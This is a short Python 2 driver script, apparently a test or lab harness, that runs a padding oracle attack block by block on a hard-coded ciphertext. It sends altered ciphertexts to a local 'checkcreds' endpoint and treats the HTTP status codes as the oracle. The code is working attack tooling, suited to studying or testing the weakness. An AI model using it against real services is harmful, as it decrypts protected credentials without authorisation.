#!/usr/bin/python


import urllib
import logging
import sys

from oracle import PaddingAttack

import Colorer

sample_encrypted = "c9f2a3f0dc970fe8cf6a084b808569fa8f4106c6e916702377a66017885607c9e1924dde1ebe84fa23454ab976e075a96e341141b82449a7"

def try_sending(enc_block):
    base_url = "http://localhost:7171/checkcreds?enc="
    base_url += enc_block.encode("hex")
    response = urllib.urlopen(base_url)
    return_code = response.getcode()
    if return_code in [200, 404, 500]:
        return return_code
    raise Exception("Yikes!")


def main():
    if sys.argv[-1] == "-d":
        logging.basicConfig(level=logging.DEBUG)
    else:
        print "For DEBUG info pass in the '-d' flag at the command line."
        logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger("test_oracle_des")

    global sample_encrypted
    sample_encrypted = sample_encrypted.decode("hex")

    p = PaddingAttack(sample_encrypted[0:8], "LOLOLOLO", try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[8:16], sample_encrypted[0:8], try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[16:24], sample_encrypted[8:16], try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[24:32], sample_encrypted[16:24], try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[32:40], sample_encrypted[24:32], try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[40:48], sample_encrypted[32:40], try_sending, 8)
    logger.info(p.attack())
    p = PaddingAttack(sample_encrypted[48:56], sample_encrypted[40:48], try_sending, 8)
    logger.info(p.attack())







if __name__ == '__main__':
    main()

